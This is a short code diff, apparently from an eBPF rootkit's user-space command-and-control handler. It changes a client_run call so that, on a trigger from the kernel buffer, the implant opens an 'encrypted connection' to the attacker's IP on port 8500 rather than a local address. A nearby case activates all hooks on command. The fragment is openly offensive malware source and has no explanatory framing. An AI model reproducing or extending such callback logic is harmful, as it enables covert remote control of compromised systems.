@@ -169,7 +169,7 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 			//TODO EXTRACT IP FROM KERNEL BUFFER
 				inet_ntop(AF_INET, &e->client_ip, attacker_ip, INET_ADDRSTRLEN);
 				printf("Starting encrypted connection with ip: %s\n", attacker_ip);
-				client_run(local_ip, 8500);
+				client_run(attacker_ip, 8500);
             	break;
 			case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
 				printf("Activating all hooks as requested\n");
